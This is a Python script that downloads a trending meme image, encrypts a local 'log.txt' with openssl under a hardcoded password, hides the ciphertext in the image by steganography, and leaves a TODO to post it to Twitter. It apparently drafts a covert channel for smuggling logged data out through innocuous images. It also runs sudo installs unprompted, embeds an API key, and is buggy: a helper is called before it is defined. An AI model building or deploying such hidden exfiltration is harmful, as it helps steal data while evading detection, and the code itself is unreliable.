import os
import subprocess
import sys
import json
import random
from io import BytesIO
pip_present = True
try:
    import pip
except ImportError:
    pip_present = False
    os.system('sudo apt install python3-venv python3-pip')
try:
    import tweepy
except ImportError:
    install("tweepy")

stegano_install = False
try:
    from stegano import lsb
    stegano_install = True
except ImportError:
    install("Stegano")

try:
    import PIL
except ImportError:
    install("Pillow")

try:
    import requests
except ImportError:
    install("requests")

def getConfig():
    #TODO get information from configuration file
    pass

def updateConfig():
    #TODO update configuration file
    pass

def DownloadTrendingImages():
    API_KEY = "c4b739c3-442e-49c2-ac44-f5ad6b0e37e3"
    headers = {'Content-Type': 'application/json'}
    api_url = "http://version1.api.memegenerator.net//Generators_Select_ByTrending?apiKey=" + API_KEY    
    response = requests.get(api_url, headers=headers)

    if response.status_code == 200:
        content = json.loads(response.content.decode('utf-8'))
        return content["result"]
    else:
        return None

def getImage():
    ImageSize = "600x600" 
    ImageSet = DownloadTrendingImages()
    ImageSet_Size = len(ImageSet)

    #get one image
    if ImageSet_Size >= 1:
        Image = random.choice(ImageSet)
    else:
        #No image not returned
        Image = None

    #image url
    url = Image["imageUrl"]
    index_of_last_slash = url.rfind("/")
    url = url[:index_of_last_slash+1] + ImageSize + "/" + url[index_of_last_slash+1:]

    response = requests.get(url)
    if response.status_code == 200:
        content = response.content
        #return JPEG file
        return PIL.Image.open(BytesIO(content))
    else:
        return None


def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])


#hide message into image
def stenographizeImage(ImagePath,NewImagePath,Text):
    
    secret_image = lsb.hide(ImagePath,message=Text)
    secret_image.save(NewImagePath)

#reveal hidden message from image
def deStenographizeImage(ImagePath):
    revealedMessage = lsb.reveal(ImagePath)
    #remove b'' strings from message
    revealedMessage = revealedMessage[2:len(revealedMessage)-1]
    return revealedMessage

def main():
    

    """
    Image size of 600x600 = 360,000 pixels
    Each byte of ASCII character can be encoded into 3 pixels
    Bytes of ascii = 360,000 / 3 = 120,000 bytes
    120,000 bytes = 117kB of text into image

    Gets image from meme generator

    """
    image_name = "test_image"
    ImagePath = "./" + image_name + ".png"
    NewImagePath = "./" + image_name + "_new" + ".png"
    JPEG_IMG = getImage()
    JPEG_IMG.save(ImagePath)
    PNG_IMAGE = PIL.Image.open(ImagePath)
    width, height = PNG_IMAGE.size
    image_text_storage = (width * height)//3 #number of ASCII character that is storable

    logged_file = "log.txt"
    encrypted_file = "encrypted.txt"
    password = "password"
    #encrypt message
    openssl_command = "openssl enc -pass pass:"+ password +" -aes-128-cbc -a -A -in "+ logged_file +" -out " + encrypted_file + " -nosalt 2> /dev/null "
    try:
        os.system(openssl_command)
    except Exception as e:
        print(e)



    with open('encrypted.txt','rb') as encrypted_text:
        message = str(encrypted_text.read())
        if image_text_storage > len(message):
            stenographizeImage(ImagePath,NewImagePath,message)
            #TODO send image to Twitter



            

main()